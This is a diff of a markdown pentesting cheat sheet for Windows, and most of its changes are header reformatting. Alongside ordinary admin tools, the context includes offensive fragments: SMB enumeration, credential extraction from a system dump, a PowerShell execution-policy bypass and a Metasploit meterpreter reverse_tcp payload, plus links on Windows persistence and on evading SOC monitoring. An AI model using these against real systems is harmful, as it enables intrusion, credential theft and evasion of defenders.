@@ -1,58 +1,58 @@
-#### windows system tools 
-##### Local User and Group Management 
+# windows system tools 
+## Local User and Group Management 
 It is a shell application to manage Windows system administrator applications.
 
 ```bash
 lusrmgr.msc
 ```
-##### System Configuration utility 
+## System Configuration utility 
 
 for diagnose startup issues
 
 ```bash
 MSConfig
 ```
-##### Task Manager 
+## Task Manager 
 
 to manage (enable/disable) startup items. 
 ```bash
 taskmgr
 ```
-##### User Account Control 
+## User Account Control 
 helps prevent unauthorized changes (which may be initiated by applications, users, viruses, or other forms of malware) to an operating system
 
 ```bash
 UserAccountControlSettings.exe
 ```
-##### Computer Management 
+## Computer Management 
 the process of managing, monitoring and optimizing a computer system for performance, availability, security
 
 ```bash
 compmgmt
 ```
-##### System Information 
+## System Information 
 (gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues.)
 
 ```bash
 msinfo32
 ```
-##### Resource Monitor 
+## Resource Monitor 
 displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules
 
 ```bash
 resmon
 ```
-##### Windows Registry 
+## Windows Registry 
 central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices
 
 ```bash
 regedit
 ```
-##### Group policy objects
+## Group policy objects
 a collection of settings that can be applied to OUs
 
 ---
-#### SMB enumeration 
+# SMB enumeration 
 
 enumerate
 
@@ -88,7 +88,7 @@ smbclient \\\\$IP\\nt4wrksv
 ```
 
 ---
-#### rdp 
+# rdp 
 
 ```bash
 rdesktop -u <username> -p <password> $IP -g 70% -r disk:folder=/home/toor/cd/apps
@@ -97,7 +97,7 @@ remmina
 ```
 
 ---
-#### AD
+# AD
 
 extract credentials and secrets from a systemdump
 ```bash
@@ -161,7 +161,7 @@ links
 * [WADComs (AD)](https://wadcoms.github.io/)
 
 ---
-#### enumeration
+# enumeration
 
 run powershell with bypass execution policy
 ```bash
@@ -240,10 +240,10 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 run -j (in background)
 ```
 ---
-#### links
-##### windows
+# links
 - [bloodhound-docker](https://github.com/belane/docker-bloodhound)
 - [механизмы закрепления в windows](https://persistence-info.github.io/)
 - [netbios.py](https://github.com/s0i37/defence/blob/main/netbios.py)(как респондер)
 - [check win cves](https://github.com/BC-SECURITY/Moriarty)
 - [check-list](https://swisskyrepo.github.io/InternalAllTheThings/)
+- [находиться невидимым в сети от соков](https://github.com/wearecaster/F31)
